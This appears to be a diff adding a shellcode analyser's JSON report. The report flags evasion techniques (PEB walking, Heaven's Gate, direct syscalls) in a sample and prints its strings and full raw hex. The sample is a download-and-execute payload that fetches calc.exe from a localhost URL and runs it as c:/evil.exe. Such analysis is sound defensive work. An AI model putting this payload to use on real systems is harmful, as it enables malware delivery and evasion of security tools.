@@ -1,0 +1,1271 @@
+{
+   "dateAnalyzed": "2022-01-18 12:28:55",
+   "secondsSinceEpoch": 1642530535.936372,
+   "fileType": "rawHex",
+   "bits": 32,
+   "entryPoint": "0x0",
+   "pushret": [
+      {
+         "address": "0x1a4",
+         "pushOffset": [
+            "0x1a4",
+            "edx"
+         ],
+         "retOffset": "0x1a5",
+         "modSecName": "rawHex",
+         "disassembly": [
+            "0x1a4      push edx ",
+            "0x1a5      ret   "
+         ],
+         "internalData": {
+            "secNum": -1,
+            "NumOpsDis": 7,
+            "points": 2
+         }
+      },
+      {
+         "address": "0x241",
+         "pushOffset": [
+            "0x241",
+            "ebx"
+         ],
+         "retOffset": "0x242",
+         "modSecName": "rawHex",
+         "disassembly": [
+            "0x241      push ebx ",
+            "0x242      ret   "
+         ],
+         "internalData": {
+            "secNum": -1,
+            "NumOpsDis": 7,
+            "points": 2
+         }
+      },
+      {
+         "address": "0x1ae",
+         "pushOffset": [
+            "0x1ae",
+            "edx"
+         ],
+         "retOffset": "0x1af",
+         "modSecName": "rawHex",
+         "disassembly": [
+            "0x1ae      push edx ",
+            "0x1af      ret   "
+         ],
+         "internalData": {
+            "secNum": -1,
+            "NumOpsDis": 7,
+            "points": 2
+         }
+      },
+      {
+         "address": "0x1b0",
+         "pushOffset": [
+            "0x1b0",
+            "ebx"
+         ],
+         "retOffset": "0x1b1",
+         "modSecName": "rawHex",
+         "disassembly": [
+            "0x1b0      push ebx ",
+            "0x1b1      ret   "
+         ],
+         "internalData": {
+            "secNum": -1,
+            "NumOpsDis": 7,
+            "points": 2
+         }
+      },
+      {
+         "address": "0x1f1",
+         "pushOffset": [
+            "0x1f1",
+            "edx"
+         ],
+         "retOffset": "0x1f2",
+         "modSecName": "rawHex",
+         "disassembly": [
+            "0x1f1      push edx ",
+            "0x1f2      ret   "
+         ],
+         "internalData": {
+            "secNum": -1,
+            "NumOpsDis": 7,
+            "points": 2
+         }
+      },
+      {
+         "address": "0x1e7",
+         "pushOffset": [
+            "0x1e7",
+            "ebx"
+         ],
+         "retOffset": "0x1e8",
+         "modSecName": "rawHex",
+         "disassembly": [
+            "0x1e7      push ebx ",
+            "0x1e8      ret   "
+         ],
+         "internalData": {
+            "secNum": -1,
+            "NumOpsDis": 7,
+            "points": 2
+         }
+      }
+   ],
+   "callpop": [
+      {
+         "address": "0x3c",
+         "modSecName": "rawHex",
+         "pop_offset": "0x41",
+         "distance": 5,
+         "disassembly": [
+            "0x3c       call 0x41 ",
+            "0x41       pop  edx "
+         ],
+         "internalData": {
+            "secNum": -1,
+            "NumOpsDis": 7
+         }
+      },
+      {
+         "address": "0x1ca",
+         "modSecName": "rawHex",
+         "pop_offset": "0x1cf",
+         "distance": 5,
+         "disassembly": [
+            "0x1ca      call 0x1cf ",
+            "0x1cf      pop  eax "
+         ],
+         "internalData": {
+            "secNum": -1,
+            "NumOpsDis": 7
+         }
+      },
+      {
+         "address": "0x22f",
+         "modSecName": "rawHex",
+         "pop_offset": "0x23f",
+         "distance": 16,
+         "disassembly": [
+            "0x22f      call 0x23f ",
+            "0x234      add  eax, 3 ",
+            "0x237      push 0x33 ",
+            "0x239      push 0x401000 ",
+            "0x23e      retf  ",
+            "0x23f      pop  ebx "
+         ],
+         "internalData": {
+            "secNum": -1,
+            "NumOpsDis": 7
+         }
+      }
+   ],
+   "PEB": [
+      {
+         "address": "0x119",
+         "modSecName": "rawHex",
+         "disassembly": [
+            "0x119      mov  edi, dword ptr fs:[0x30] ",
+            "0x120      mov  edi, dword ptr [edi + 0xc] ",
+            "0x123      jmp  0x12d ",
+            "0x125      mov  edi, dword ptr [edi + 0x14] ",
+            "0x128      mov  esi, dword ptr [edi + 0x28] "
+         ],
+         "internalData": {
+            "secNum": -1,
+            "NumOpsDis": 19,
+            "points": 3
+         }
+      },
+      {
+         "address": "0x1dc",
+         "modSecName": "rawHex",
+         "disassembly": [
+            "0x1dc      mov  ebp, dword ptr fs:[eax + 0x30] ",
+            "0x1e0      mov  edi, dword ptr [edi + 0xc] ",
+            "0x1e3      mov  edi, dword ptr [edi + 0x14] ",
+            "0x1e6      lodsd eax, dword ptr [esi] ",
+            "0x1e7      push ebx ",
+            "0x1e8      ret   "
+         ],
+         "internalData": {
+            "secNum": -1,
+            "NumOpsDis": 19,
+            "points": 4
+         }
+      }
+   ],
+   "fstenv": [
+      {
+         "address": "0xd4",
+         "modSecName": "rawHex",
+         "FPU_offset": "0xcd",
+         "FSTENV_offset": "0xd4",
+         "disassembly": [
+            "0xcd       fsqrt  ",
+            "0xcf       nop   ",
+            "0xd0       nop   ",
+            "0xd1       nop   ",
+            "0xd2       nop   ",
+            "0xd3       wait  ",
+            "0xd4       fnstenv [esp + 4] "
+         ],
+         "internalData": {
+            "secNum": -1,
+            "NumOpsDis": 7,
+            "NumOpsBack": 10,
+            "printEnd": "0xd8"
+         }
+      },
+      {
+         "address": "0x114",
+         "modSecName": "rawHex",
+         "FPU_offset": "0x109",
+         "FSTENV_offset": "0x114",
+         "disassembly": [
+            "0x109      fldpi  ",
+            "0x10b      mov  eax, 0x42 ",
+            "0x110      add  eax, 0x20 ",
+            "0x113      wait  ",
+            "0x114      fnstenv [eax] "
+         ],
+         "internalData": {
+            "secNum": -1,
+            "NumOpsDis": 5,
+            "NumOpsBack": 10,
+            "printEnd": "0x116"
+         }
+      },
+      {
+         "address": "0x8a",
+         "modSecName": "rawHex",
+         "FPU_offset": "0x86",
+         "FSTENV_offset": "0x8a",
+         "disassembly": [
+            "0x86       fsqrt  ",
+            "0x88       nop   ",
+            "0x89       nop   ",
+            "0x8a       fnstenv [esp + 4] "
+         ],
+         "internalData": {
+            "secNum": -1,
+            "NumOpsDis": 4,
+            "NumOpsBack": 10,
+            "printEnd": "0x8e"
+         }
+      }
+   ],
+   "heavensGate": [
+      {
+         "address": "0x1ad",
+         "modSecName": "rawHex",
+         "pushOffset": 422,
+         "heaven_offset": "0x1ad",
+         "destLocation": "0x33",
+         "disassembly": [
+            "push edx     0x1a4 (offset 0x1a4)",
+            "ret      0x1a5 (offset 0x1a5)",
+            "push 0x33     0x1a6 (offset 0x1a6)",
+            "push 0xdeafbeef     0x1a8 (offset 0x1a8)",
+            "retf      0x1ad (offset 0x1ad)"
+         ],
+         "internalData": {
+            "secNum": -1,
+            "NumOpsDis": -1,
+            "NumOpsBack": 10,
+            "pivottype": "retf"
+         }
+      },
+      {
+         "address": "0x1b2",
+         "modSecName": "rawHex",
+         "pushOffset": -1,
+         "heaven_offset": "0x1b2",
+         "destLocation": "0x12345678",
+         "disassembly": [
+            "ljmp 0x33:0x12345678     0x1b2 (offset 0x1b2)"
+         ],
+         "internalData": {
+            "secNum": -1,
+            "NumOpsDis": -1,
+            "NumOpsBack": 10,
+            "pivottype": "ljmp/lcall"
+         }
+      },
+      {
+         "address": "0x1d0",
+         "modSecName": "rawHex",
+         "pushOffset": -1,
+         "heaven_offset": "0x1d0",
+         "destLocation": "0x12310000",
+         "disassembly": [
+            "lcall 0x33:0x12310000     0x1d0 (offset 0x1d0)"
+         ],
+         "internalData": {
+            "secNum": -1,
+            "NumOpsDis": -1,
+            "NumOpsBack": 10,
+            "pivottype": "ljmp/lcall"
+         }
+      },
+      {
+         "address": "0x1f0",
+         "modSecName": "rawHex",
+         "pushOffset": 489,
+         "heaven_offset": "0x1f0",
+         "destLocation": "0x33",
+         "disassembly": [
+            "push ebx     0x1e7 (offset 0x1e7)",
+            "ret      0x1e8 (offset 0x1e8)",
+            "push 0x33     0x1e9 (offset 0x1e9)",
+            "push 0x11111111     0x1eb (offset 0x1eb)",
+            "retf      0x1f0 (offset 0x1f0)"
+         ],
+         "internalData": {
+            "secNum": -1,
+            "NumOpsDis": -1,
+            "NumOpsBack": 10,
+            "pivottype": "retf"
+         }
+      },
+      {
+         "address": "0x1f3",
+         "modSecName": "rawHex",
+         "pushOffset": -1,
+         "heaven_offset": "0x1f3",
+         "destLocation": "0xdeadbeef",
+         "disassembly": [
+            "ljmp 0x33:0xdeadbeef     0x1f3 (offset 0x1f3)"
+         ],
+         "internalData": {
+            "secNum": -1,
+            "NumOpsDis": -1,
+            "NumOpsBack": 10,
+            "pivottype": "ljmp/lcall"
+         }
+      },
+      {
+         "address": "0x216",
+         "modSecName": "rawHex",
+         "pushOffset": -1,
+         "heaven_offset": "0x216",
+         "destLocation": "0x1337c0de",
+         "disassembly": [
+            "lcall 0x33:0x1337c0de     0x216 (offset 0x216)"
+         ],
+         "internalData": {
+            "secNum": -1,
+            "NumOpsDis": -1,
+            "NumOpsBack": 10,
+            "pivottype": "ljmp/lcall"
+         }
+      },
+      {
+         "address": "0x23e",
+         "modSecName": "rawHex",
+         "pushOffset": 567,
+         "heaven_offset": "0x23e",
+         "destLocation": "0x33",
+         "disassembly": [
+            "call 0x23f     0x22f (offset 0x22f)",
+            "add eax, 3     0x234 (offset 0x234)",
+            "push 0x33     0x237 (offset 0x237)",
+            "push 0x401000     0x239 (offset 0x239)",
+            "retf      0x23e (offset 0x23e)"
+         ],
+         "internalData": {
+            "secNum": -1,
+            "NumOpsDis": -1,
+            "NumOpsBack": 10,
+            "pivottype": "retf"
+         }
+      }
+   ],
+   "syscall": [
+      {
+         "address": "0x155",
+         "modSecName": "rawHex",
+         "eax": "0x26",
+         "c0_offset": "0x155",
+         "disassembly": [
+            "jmp    0x12d                          0x142   ",
+            "cmp    edx, ebx                       0x144   ",
+            "mov    eax, dword ptr [edi + 0x10]    0x146   ",
+            "mov    edi, dword ptr [edi]           0x149   ",
+            "xor    ebx, ebx                       0x14b   ",
+            "xor    ebx, eax                       0x14d   ",
+            "push   0x26                           0x14f   ",
+            "pop    eax                            0x151   ",
+            "xor    ecx, ecx                       0x152   ",
+            "push   ebx                            0x154   ",
+            "call   dword ptr fs:[0xc0]            0x155   "
+         ],
+         "syscalls": "OS: Windows Server 2008 (SP0) Syscall: NtAccessCheckAndAuditAlarm\nOS: Windows 10 (20H2) Syscall: NtOpenProcess\n",
+         "internalData": {
+            "NumOpsDis": -1,
+            "NumOpsBack": 10,
+            "secNum": -1
+         }
+      },
+      {
+         "address": "0x162",
+         "modSecName": "rawHex",
+         "eax": "0x26",
+         "c0_offset": "0x162",
+         "disassembly": [
+            "xor    ebx, ebx                       0x14b   ",
+            "xor    ebx, eax                       0x14d   ",
+            "push   0x26                           0x14f   ",
+            "pop    eax                            0x151   ",
+            "xor    ecx, ecx                       0x152   ",
+            "push   ebx                            0x154   ",
+            "call   dword ptr fs:[0xc0]            0x155   ",
+            "mov    ecx, eax                       0x15c   ",
+            "sub    ecx, 0xb                       0x15e   ",
+            "push   ecx                            0x161   ",
+            "call   dword ptr fs:[0xc0]            0x162   "
+         ],
+         "syscalls": "OS: Windows Server 2008 (SP0) Syscall: NtAccessCheckAndAuditAlarm\nOS: Windows 10 (20H2) Syscall: NtOpenProcess\n",
+         "internalData": {
+            "NumOpsDis": -1,
+            "NumOpsBack": 10,
+            "secNum": -1
+         }
+      },
+      {
+         "address": "0x183",
+         "modSecName": "rawHex",
+         "eax": "0x26",
+         "c0_offset": "0x183",
+         "disassembly": [
+            "ret                                   0x16b   ",
+            "mov    edx, ebp                       0x16c   ",
+            "add    edx, dword ptr [edx + 0x3c]    0x16e   ",
+            "mov    edx, dword ptr [edx + 0x78]    0x171   ",
+            "add    edx, ebp                       0x174   ",
+            "mov    ebx, dword ptr [edx + 0x20]    0x176   ",
+            "push   0x13                           0x179   ",
+            "pop    ecx                            0x17b   ",
+            "mov    eax, 0x13                      0x17c   ",
+            "add    eax, ecx                       0x181   ",
+            "call   dword ptr fs:[0xc0]            0x183   "
+         ],
+         "syscalls": "OS: Windows Server 2008 (SP0) Syscall: NtAccessCheckAndAuditAlarm\nOS: Windows 10 (20H2) Syscall: NtOpenProcess\n",
+         "internalData": {
+            "NumOpsDis": -1,
+            "NumOpsBack": 10,
+            "secNum": -1
+         }
+      },
+      {
+         "address": "0x21d",
+         "modSecName": "rawHex",
+         "eax": "0x3a",
+         "c0_offset": "0x21d",
+         "disassembly": [
+            "movzx  eax, word ptr [eax]            0x204   ",
+            "push   0x26                           0x207   ",
+            "pop    eax                            0x209   ",
+            "add    eax, 0x14                      0x20a   ",
+            "xor    ebx, ebx                       0x20d   ",
+            "add    ebx, eax                       0x20f   ",
+            "mov    edx, ebx                       0x211   ",
+            "sub    edx, eax                       0x213   ",
+            "push   edx                            0x215   ",
+            "lcall  0x33:0x1337c0de                0x216   ",
+            "call   dword ptr fs:[0xc0]            0x21d   "
+         ],
+         "syscalls": "OS: Windows Server 2008 (SP0) Syscall: NtQueryAttributesFile\nOS: Windows 10 (20H2) Syscall: NtWriteVirtualMemory\n",
+         "internalData": {
+            "NumOpsDis": -1,
+            "NumOpsBack": 10,
+            "secNum": -1
+         }
+      }
+   ],
+   "strings": [
+      {
+         "type": "ascii",
+         "offset": "0x15",
+         "length": "4",
+         "value": "text",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x58",
+         "length": "3",
+         "value": "ZUR",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x6e",
+         "length": "4",
+         "value": "Z]UR",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0xac",
+         "length": "3",
+         "value": "URj",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x129",
+         "length": "3",
+         "value": "w(1",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x14f",
+         "length": "4",
+         "value": "j&X1",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x177",
+         "length": "3",
+         "value": "Z j",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x1a6",
+         "length": "3",
+         "value": "j3h",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x1b3",
+         "length": "3",
+         "value": "xV4",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x1c2",
+         "length": "3",
+         "value": "A9J",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x1e9",
+         "length": "3",
+         "value": "j3h",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x207",
+         "length": "3",
+         "value": "j&X",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x237",
+         "length": "3",
+         "value": "j3h",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x255",
+         "length": "10",
+         "value": "urlmon.dll",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x260",
+         "length": "11",
+         "value": "c:/evil.exe",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x26c",
+         "length": "30",
+         "value": "http://127.0.0.1:8080/calc.exe",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x383",
+         "length": "4",
+         "value": "file",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x394",
+         "length": "8",
+         "value": "work.asm",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x3a7",
+         "length": "4",
+         "value": "text",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x3cb",
+         "length": "7",
+         "value": "absolut",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x3ee",
+         "length": "6",
+         "value": "geteip",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x4d8",
+         "length": "6",
+         "value": "URLMON",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x4ea",
+         "length": "4",
+         "value": "PATH",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x5c3",
+         "length": "7",
+         "value": "feat.00",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x5d8",
+         "length": "14",
+         "value": "mainentrypoint",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x5e7",
+         "length": "18",
+         "value": "get_module_address",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x5fa",
+         "length": "16",
+         "value": "next_module_loop",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x60b",
+         "length": "16",
+         "value": "module_hash_loop",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x61c",
+         "length": "14",
+         "value": "end_hash_check",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x62b",
+         "length": "20",
+         "value": "end_module_hash_loop",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x640",
+         "length": "15",
+         "value": "get_api_address",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x650",
+         "length": "13",
+         "value": "load_api_hash",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x65e",
+         "length": "13",
+         "value": "load_api_name",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x66c",
+         "length": "16",
+         "value": "create_hash_loop",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x67d",
+         "length": "9",
+         "value": "callpop_1",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x687",
+         "length": "13",
+         "value": "load_api_addy",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x695",
+         "length": "9",
+         "value": "callpop_2",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x69f",
+         "length": "9",
+         "value": "PUTTY_URL",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x6a9",
+         "length": "17",
+         "value": "KERNEL32HASHTABLE",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x6bb",
+         "length": "22",
+         "value": "KERNEL32FUNCTIONSTABLE",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x6d2",
+         "length": "23",
+         "value": "KERNEL32_CREATEPROCESSA",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x6ea",
+         "length": "20",
+         "value": "KERNEL32_LOADLIBRARY",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x6ff",
+         "length": "15",
+         "value": "URLMONHASHTABLE",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x70f",
+         "length": "20",
+         "value": "URLMONFUNCTIONSTABLE",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x724",
+         "length": "24",
+         "value": "URLMON_URLDOWNLOADTOFILE",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x73d",
+         "length": "19",
+         "value": "PROCESS_INFORMATION",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x751",
+         "length": "11",
+         "value": "STARTUPINFO",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x75d",
+         "length": "11",
+         "value": "ExitProcess",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x15",
+         "length": "4",
+         "value": "text",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x58",
+         "length": "3",
+         "value": "ZUR",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x6e",
+         "length": "4",
+         "value": "Z]UR",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0xac",
+         "length": "3",
+         "value": "URj",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x129",
+         "length": "3",
+         "value": "w(1",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x14f",
+         "length": "4",
+         "value": "j&X1",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x177",
+         "length": "3",
+         "value": "Z j",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x1a6",
+         "length": "3",
+         "value": "j3h",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x1b3",
+         "length": "3",
+         "value": "xV4",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x1c2",
+         "length": "3",
+         "value": "A9J",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x1e9",
+         "length": "3",
+         "value": "j3h",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x207",
+         "length": "3",
+         "value": "j&X",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x237",
+         "length": "3",
+         "value": "j3h",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x255",
+         "length": "10",
+         "value": "urlmon.dll",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x260",
+         "length": "11",
+         "value": "c:/evil.exe",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x26c",
+         "length": "30",
+         "value": "http://127.0.0.1:8080/calc.exe",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x383",
+         "length": "4",
+         "value": "file",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x394",
+         "length": "8",
+         "value": "work.asm",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x3a7",
+         "length": "4",
+         "value": "text",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x3cb",
+         "length": "7",
+         "value": "absolut",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x3ee",
+         "length": "6",
+         "value": "geteip",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x4d8",
+         "length": "6",
+         "value": "URLMON",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x4ea",
+         "length": "4",
+         "value": "PATH",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x5c3",
+         "length": "7",
+         "value": "feat.00",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x5d8",
+         "length": "14",
+         "value": "mainentrypoint",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x5e7",
+         "length": "18",
+         "value": "get_module_address",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x5fa",
+         "length": "16",
+         "value": "next_module_loop",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x60b",
+         "length": "16",
+         "value": "module_hash_loop",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x61c",
+         "length": "14",
+         "value": "end_hash_check",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x62b",
+         "length": "20",
+         "value": "end_module_hash_loop",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x640",
+         "length": "15",
+         "value": "get_api_address",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x650",
+         "length": "13",
+         "value": "load_api_hash",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x65e",
+         "length": "13",
+         "value": "load_api_name",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x66c",
+         "length": "16",
+         "value": "create_hash_loop",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x67d",
+         "length": "9",
+         "value": "callpop_1",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x687",
+         "length": "13",
+         "value": "load_api_addy",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x695",
+         "length": "9",
+         "value": "callpop_2",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x69f",
+         "length": "9",
+         "value": "PUTTY_URL",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x6a9",
+         "length": "17",
+         "value": "KERNEL32HASHTABLE",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x6bb",
+         "length": "22",
+         "value": "KERNEL32FUNCTIONSTABLE",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x6d2",
+         "length": "23",
+         "value": "KERNEL32_CREATEPROCESSA",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x6ea",
+         "length": "20",
+         "value": "KERNEL32_LOADLIBRARY",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x6ff",
+         "length": "15",
+         "value": "URLMONHASHTABLE",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x70f",
+         "length": "20",
+         "value": "URLMONFUNCTIONSTABLE",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x724",
+         "length": "24",
+         "value": "URLMON_URLDOWNLOADTOFILE",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x73d",
+         "length": "19",
+         "value": "PROCESS_INFORMATION",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x751",
+         "length": "11",
+         "value": "STARTUPINFO",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x75d",
+         "length": "11",
+         "value": "ExitProcess",
+         "source": "shellcode"
+      }
+   ],
+   "shellcode": {
+      "rawhex": "4c010100b8da47608203000021000000000000002e746578740000000000000000000000c40200003c00000000030000000000000d00000020005060e8000000005a8d52fb89e581ec0010000052bb8efe1f4be8be0000005a555289c58db24f0200008dba5b020000e8fe0000005a5d55528db21902000056ffb25f02000058ffd05a5d9090d9fa9090d9742404555289c58db2630200008dba6b020000e8c90000005a5d9bd9710cd9750755526a006a008db224020000568db230020000566a00ffb26b02000058ffd05a5dd9fa909090909bd974240455528db26f020000568db27f020000566a006a006a006a006a006a008db224020000566a00ffb25b02000058ffd05a5dc3d9ebb84200000083c0209bd930fc31ff648b3d300000008b7f0ceb088b7f148b772831d266ad84c074113c4172063c5a77020c20c1c20730c2ebe939da8b47108b3f31db31c36a265831c95364ff15c000000089c183e90b5164ff15c000000075bdc389ea03523c8b527801ea8b5a206a1359b81300000001c864ff15c000000001eb31c957568b368b3b01ef5231d2c1c207321747803f0075f552c36a3368efbeafdecb52c353c3ea785634123300925a39f0741983c30441394a1875ca5e5fe800000000589a000031123300c35e5fad56648b68308b7f0c8b7f14ad53c36a336811111111cb52c3eaefbeadde330089eb89de035a248d044b0fb7006a265883c01431db01c389da29c2529adec03713330064ff15c00000008d048603421c8b0001f0abe80b00000083c0036a336800104000cb5b5b53c35e83c30441813effff00000f853affffffc375726c6d6f6e2e646c6c00633a2f6576696c2e65786500687474703a2f2f3132372e302e302e313a383038302f63616c632e65786500c78a31462680acc8ffff0000010000000200000099235dd9ffff000003000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000002300000002000000060029000000020000000600380000000200000006003f000000020000000600580000000200000006005e000000020000000600780000000200000006007f00000002000000060088000000020000000600a0000000020000000600a7000000020000000600ba000000020000000600c30000000200000006002e66696c6500000000000000feff00006701776f726b2e61736d000000000000000000002e7465787400000000000000010000000301c40200000d000000000000000000000000002e6162736f6c757400000000ffff00000300000000000400000000000000000000000200676574656970000000000000000000000200000000001300000000000000000000000200000000002600000000000000000000000200000000003700000000000000000000000200000000004800000000000000000000000200000000005700000000000000000000000200000000006c00000000000000000000000200000000007c00000000000000000000000200000000008a0000000000000000000000020000000000980000000000000000000000020000000000a90000000000000000000000020000000000b30000000000000000000000020000000000c10000000000000000000000020055524c4d4f4e00000000000000000000020050415448000000000000000000000000020000000000cb0000000000000000000000020000000000d50000000000000000000000020000000000e70000000000000000000000020000000000fe00000000000000000000000200000000001601000000000000000000000200000000002b01000000000000000000000200000000003b01000000000000000000000200000000005001000000000000000000000200000000006901000000000000000000000200000000007d0100000000000000000000020000000000890100000000000000000000020040666561742e303001000000ffff00000300950100006d61696e656e747279706f696e74006765745f6d6f64756c655f61646472657373006e6578745f6d6f64756c655f6c6f6f70006d6f64756c655f686173685f6c6f6f7000656e645f686173685f636865636b00656e645f6d6f64756c655f686173685f6c6f6f70006765745f6170695f61646472657373006c6f61645f6170695f68617368006c6f61645f6170695f6e616d65006372656174655f686173685f6c6f6f700063616c6c706f705f31006c6f61645f6170695f616464790063616c6c706f705f320050555454595f55524c004b45524e454c3332484153485441424c45004b45524e454c333246554e4354494f4e535441424c45004b45524e454c33325f43524541544550524f4345535341004b45524e454c33325f4c4f41444c4942524152590055524c4d4f4e484153485441424c450055524c4d4f4e46554e4354494f4e535441424c450055524c4d4f4e5f55524c444f574e4c4f4144544f46494c450050524f434553535f494e464f524d4154494f4e0053544152545550494e464f004578697450726f6365737300",
